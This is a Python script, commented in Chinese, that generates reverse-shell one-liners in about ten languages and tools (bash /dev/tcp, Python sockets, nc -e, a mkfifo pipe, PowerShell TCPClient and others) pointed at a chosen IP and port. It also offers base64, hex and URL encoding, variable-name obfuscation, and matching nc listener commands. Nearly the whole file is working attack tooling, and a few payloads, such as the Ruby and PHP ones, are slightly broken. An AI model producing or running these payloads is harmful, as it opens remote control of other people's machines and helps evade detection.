#!/usr/bin/env python3
"""
反弹Shell生成器
支持多种语言、编码方式、混淆和监听器命令生成
"""

import argparse
import json
import sys
import base64
import random
import string
import urllib.parse
import signal


def generate_bash(ip, port, os_type="linux"):
    """生成Bash反弹Shell"""
    if os_type == "windows":
        # Windows下的bash（如Git Bash）
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def generate_python(ip, port, os_type="linux"):
    """生成Python反弹Shell"""
    if os_type == "windows":
        return (
            f"python -c "
            f"'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{ip}\",{port}));"
            f"os.dup2(s.stdin.fileno(),0);"
            f"os.dup2(s.stdout.fileno(),1);"
            f"os.dup2(s.stderr.fileno(),2);"
            f"subprocess.call([\"cmd.exe\"]);'"
        )
    return (
        f"python3 -c "
        f"'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{ip}\",{port}));"
        f"os.dup2(s.stdin.fileno(),0);"
        f"os.dup2(s.stdout.fileno(),1);"
        f"os.dup2(s.stderr.fileno(),2);"
        f"subprocess.call([\"/bin/sh\"]);'"
    )


def generate_perl(ip, port, os_type="linux"):
    """生成Perl反弹Shell"""
    shell = "/bin/sh"
    if os_type == "windows":
        shell = "cmd.exe"
    return (
        f"perl -e "
        f"'use Socket;socket(S,2,1,0);"
        f"connect(S,pack_sockaddr_in({port},inet_aton(\"{ip}\")));"
        f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        f"exec(\"{shell}\");'"
    )


def generate_ruby(ip, port, os_type="linux"):
    """生成Ruby反弹Shell"""
    shell = "/bin/sh"
    if os_type == "windows":
        shell = "cmd.exe"
    return (
        f"ruby -rsocket -e "
        f"'c=Socket.new(Socket::AF_INET,Socket::SOCK_STREAM,0);"
        f"stdin=IO.new(c.fileno,STDIN.fileno);"
        f"stdout=IO.new(c.fileno,STDOUT.fileno);"
        f"stderr=IO.new(c.fileno,STDERR.fileno);"
        f"exec(\"{shell}\")'"
    ).replace("stdin=IO.new", "c.connect(Socket.pack_sockaddr_in")
    # 修正Ruby payload
    return (
        f"ruby -rsocket -e "
        f"'exit if fork;"
        f"c=TCPSocket.new(\"{ip}\",\"{port}\");"
        f"while(cmd=c.gets);"
        f"IO.popen(cmd,\"r\"){{|io|c.print io.read}} end'"
    )


def generate_php(ip, port, os_type="linux"):
    """生成PHP反弹Shell"""
    shell = "/bin/sh"
    if os_type == "windows":
        shell = "cmd.exe"
    return (
        f"php -r "
        f"'$sock=fsockopen(\"{ip}\",{port});"
        f"exec(\"{shell} -i <&3 >&3 2>&3\");'"
    )


def generate_node(ip, port, os_type="linux"):
    """生成Node.js反弹Shell"""
    shell_cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    if os_type == "windows":
        shell_cmd = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{{0}};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$client.Close()\""
    return f"require('child_process').exec('{shell_cmd}')"


def generate_nc(ip, port, os_type="linux"):
    """生成Netcat反弹Shell"""
    if os_type == "windows":
        return f"nc.exe -e cmd.exe {ip} {port}"
    # 优先使用nc -e
    return f"nc -e /bin/sh {ip} {port}"


def generate_ncat(ip, port, os_type="linux"):
    """生成Ncat反弹Shell"""
    if os_type == "windows":
        return f"ncat.exe -e cmd.exe {ip} {port} --ssl"
    return f"ncat -e /bin/sh {ip} {port} --ssl"


def generate_nc_fifo(ip, port, os_type="linux"):
    """生成使用FIFO的Netcat反弹Shell（兼容无-e选项的nc）"""
    return (
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    )


def generate_powershell(ip, port, os_type="windows"):
    """生成PowerShell反弹Shell"""
    return (
        f"powershell -nop -c "
        f'"$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});'
        f"$s = $client.GetStream();"
        f"[byte[]]$b = 0..65535|%{{0}};"
        f"while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{;"
        f"$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);"
        f"$sb = (iex $d 2>&1 | Out-String );"
        f"$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';"
        f"$sbt = ([text.encoding]::ASCII).GetBytes($sb2);"
        f"$s.Write($sbt,0,$sbt.Length);"
        f"$s.Flush()}};"
        f'$client.Close()"'
    )


def generate_java(ip, port, os_type="linux"):
    """生成Java反弹Shell"""
    shell = "/bin/bash"
    if os_type == "windows":
        shell = "cmd.exe"
    shell_cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return (
        f'Runtime.getRuntime().exec(new String[]{{"{shell}","-c","{shell_cmd}"}});'
    )


# Shell生成器映射
SHELL_GENERATORS = {
    "bash": generate_bash,
    "python": generate_python,
    "perl": generate_perl,
    "ruby": generate_ruby,
    "php": generate_php,
    "node": generate_node,
    "nc": generate_nc,
    "ncat": generate_ncat,
    "powershell": generate_powershell,
    "java": generate_java,
}


def encode_payload(payload, encoding):
    """编码payload"""
    if encoding == "none":
        return payload

    payload_bytes = payload.encode("utf-8")

    if encoding == "base64":
        return base64.b64encode(payload_bytes).decode("utf-8")
    elif encoding == "hex":
        return payload_bytes.hex()
    elif encoding == "url":
        return urllib.parse.quote(payload, safe="")
    else:
        return payload


def obfuscate_bash(payload, ip, port):
    """Bash payload混淆"""
    # 变量替换
    var_name = "".join(random.choices(string.ascii_lowercase, k=6))
    parts = ip.split(".")
    ip_var = "".join(random.choices(string.ascii_lowercase, k=4))

    # 使用变量拼接IP
    obfuscated = (
        f"{ip_var}='{parts[0]}.{parts[1]}.{parts[2]}.{parts[3]}';"
        f"bash -i >& /dev/tcp/${ip_var}/{port} 0>&1"
    )
    return obfuscated


def obfuscate_python(payload, ip, port):
    """Python payload混淆"""
    var_a = "".join(random.choices(string.ascii_lowercase, k=5))
    var_b = "".join(random.choices(string.ascii_lowercase, k=5))
    var_c = "".join(random.choices(string.ascii_lowercase, k=5))
    var_d = "".join(random.choices(string.ascii_lowercase, k=5))

    obfuscated = (
        f"python3 -c '"
        f"import socket,subprocess,os as {var_d};"
        f"{var_a}=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"{var_a}.connect((\"{ip}\",{port}));"
        f"{var_d}.dup2({var_a}.stdin.fileno(),0);"
        f"{var_d}.dup2({var_a}.stdout.fileno(),1);"
        f"{var_d}.dup2({var_a}.stderr.fileno(),2);"
        f"subprocess.call([\"/bin/sh\"]);'"
    )
    return obfuscated


def obfuscate_payload(payload, shell_type, ip, port):
    """通用payload混淆"""
    if shell_type == "bash":
        return obfuscate_bash(payload, ip, port)
    elif shell_type == "python":
        return obfuscate_python(payload, ip, port)
    else:
        # 对其他类型，使用变量名随机化
        # 简单的字符串拼接混淆
        chars = list(payload)
        result = ""
        for i, c in enumerate(chars):
            if i > 0 and i % 20 == 0:
                result += "'+'"
            result += c
        return f"'{''.join(result)}'"


def generate_listener(port, shell_type, os_type="linux"):
    """生成监听器命令"""
    if shell_type == "ncat":
        return f"ncat -lvnp {port} --ssl"
    elif shell_type == "powershell":
        # Windows监听器
        return f"nc -lvnp {port}"
    else:
        # 标准nc监听器
        return f"nc -lvnp {port}"



_timeout_value = 300

def _timeout_handler(signum, frame):
    """超时信号处理器"""
    print(json.dumps({"status": "timeout", "error": f"操作超时({_timeout_value}秒)", "timeout": _timeout_value}, ensure_ascii=False))
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="反弹Shell生成器 - 支持多种语言、编码和混淆"
    )
    parser.add_argument("--ip", required=True, help="反弹目标IP（必填）")
    parser.add_argument("--port", required=True, type=int, help="反弹端口（必填）")
    parser.add_argument(
        "--type",
        choices=["bash", "python", "perl", "ruby", "php", "node", "nc", "ncat", "java", "powershell"],
        default="bash",
        help="Shell类型（默认bash）",
    )
    parser.add_argument(
        "--os",
        choices=["linux", "windows", "macos"],
        default="linux",
        help="目标系统（默认linux）",
    )
    parser.add_argument(
        "--encode",
        choices=["none", "base64", "hex", "url"],
        default="none",
        help="编码方式（默认none）",
    )
    parser.add_argument(
        "--obfuscate",
        action="store_true",
        default=False,
        help="是否混淆（默认False）",
    )
    parser.add_argument(
        "--listener",
        type=str,
        default="true",
        help="是否生成监听器命令（默认True）",
    )

    parser.add_argument("--timeout", type=int, default=300, help="操作超时时间(秒)")
    args = parser.parse_args()

    global _timeout_value
    _timeout_value = args.timeout
    signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(args.timeout)

    # 解析listener参数
    generate_listener_flag = args.listener.lower() in ("true", "1", "yes", "y")

    print("=" * 60, file=sys.stderr)
    print("反弹Shell生成器", file=sys.stderr)
    print(f"目标IP: {args.ip}:{args.port}", file=sys.stderr)
    print(f"Shell类型: {args.type}", file=sys.stderr)
    print(f"目标系统: {args.os}", file=sys.stderr)
    print(f"编码: {args.encode}", file=sys.stderr)
    print(f"混淆: {args.obfuscate}", file=sys.stderr)
    print("=" * 60, file=sys.stderr)

    # 生成原始shell
    generator = SHELL_GENERATORS.get(args.type)
    if generator is None:
        print(f"错误: 不支持的Shell类型: {args.type}", file=sys.stderr)
        sys.exit(1)

    shell = generator(args.ip, args.port, args.os)

    # 混淆
    obfuscated = False
    if args.obfuscate:
        shell = obfuscate_payload(shell, args.type, args.ip, args.port)
        obfuscated = True

    # 编码
    encoded_shell = encode_payload(shell, args.encode)

    # 生成监听器命令
    listener_cmd = ""
    if generate_listener_flag:
        listener_cmd = generate_listener(args.port, args.type, args.os)

    result = {
        "ip": args.ip,
        "port": args.port,
        "type": args.type,
        "os": args.os,
        "shell": shell if args.encode == "none" else f"echo {encoded_shell}|base64 -d|bash" if args.encode == "base64" else encoded_shell,
        "encoded": encoded_shell if args.encode != "none" else "",
        "encoding": args.encode,
        "obfuscated": obfuscated,
        "listener": listener_cmd,
    }

    # 如果没有编码，shell就是原始的；如果编码了，encoded字段是编码后的
    if args.encode == "none":
        result["shell"] = shell
        result["encoded"] = ""
    else:
        result["shell"] = shell  # 原始shell
        result["encoded"] = encoded_shell

    output_json = json.dumps(result, ensure_ascii=False, indent=2)

    # 输出到stdout
    print(output_json)

    # 摘要
    print(f"\n{'=' * 60}", file=sys.stderr)
    print("生成的反弹Shell:", file=sys.stderr)
    if args.encode != "none":
        print(f"  [编码后] {encoded_shell}", file=sys.stderr)
        print(f"  [解码命令] echo {encoded_shell}|base64 -d|bash", file=sys.stderr)
    else:
        print(f"  {shell}", file=sys.stderr)
    if listener_cmd:
        print(f"\n监听器命令:", file=sys.stderr)
        print(f"  {listener_cmd}", file=sys.stderr)
    print("=" * 60, file=sys.stderr)


if __name__ == "__main__":
    main()
